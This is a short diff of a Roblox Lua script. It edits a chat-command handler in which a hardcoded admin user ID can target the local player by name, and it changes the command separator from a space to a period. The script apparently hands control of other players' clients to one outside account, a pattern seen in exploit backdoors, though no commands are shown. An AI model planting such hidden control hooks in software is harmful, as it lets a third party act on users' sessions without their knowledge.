@@ -1,17 +1,14 @@
 local player = game.Players.LocalPlayer
-
 local Players = game:GetService("Players")
 
 local Admins = {
     2935773828, --Airsoft
-    
 }
-
 local function commands(msg, plr)
     if table.find(Admins, plr) then
         local Mod = game:GetService("Players"):GetPlayerByUserId(plr)
         local Msg = string.lower(msg)
-        local SplitCMD = string.split(Msg, " ")
+        local SplitCMD = string.split(Msg, ".")
         local Lower = string.lower(player.Name)
         local Allowed = string.find(Lower, SplitCMD[2])
         if Allowed then
@@ -97,7 +94,6 @@ Players.PlayerAdded:Connect(
         end
     end
 )
-
 for i, v in pairs(game:GetService("Players"):GetChildren()) do
     local ADMINS = table.find(Admins, v.UserId)
     if ADMINS then
